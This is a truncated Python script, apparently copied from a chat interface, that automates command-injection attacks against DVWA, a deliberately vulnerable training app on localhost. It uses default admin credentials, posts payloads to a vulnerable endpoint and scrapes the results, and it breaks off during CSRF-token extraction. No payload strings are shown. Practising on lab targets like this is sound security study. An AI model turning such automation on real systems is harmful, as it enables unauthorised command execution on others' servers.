Command Injection with System Information Commands

python

Verify

Open In Editor
Edit
Copy code
import requests
from bs4 import BeautifulSoup

# Configuration
DVWA_URL = 'http://localhost/dvwa/'
LOGIN_URL = 'http://localhost/dvwa/login.php'
VULN_URL = 'http://localhost/dvwa/vulnerabilities/command_shell/'
REPORT_FILE = 'commandinjectionreport_sysinfo.txt'

# DVWA Credentials
USERNAME = 'admin'
PASSWORD = 'admin'

# Function to perform command injection and retrieve data
def perform_command_injection(session, payload):
    target_url = f'{VULN_URL}'
    data = {'ip': payload}
    response = session.post(target_url, data=data)
    soup = BeautifulSoup(response.text, 'html.parser')
    extracted_data = soup.find_all('pre')
    return target_url, [data.text.strip() for data in extracted_data]

# Function to login to DVWA and retrieve CSRF token
def login_to_dvwa():
    session = requests.Session()
    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.content, 'html.parser')
    
    # Extract CSRF token
    csrf_token = soup.find('input', {'name': 'user_token'})['value'] if
